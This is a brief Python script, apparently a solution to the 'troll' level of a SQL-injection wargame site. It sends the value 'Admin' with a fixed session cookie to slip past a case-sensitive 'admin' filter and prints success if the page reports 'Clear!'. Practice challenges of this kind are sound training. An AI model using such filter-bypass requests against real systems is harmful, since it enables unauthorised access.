import requests

url ="https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php/"
cookie = {"PHPSESSID":"c0bed5cfkoofgp0l3nfhdr2c89"}

if requests.get(url,{"id":"Admin"},cookies=cookie).text.find("Clear!") > 0:print("[*] Success")
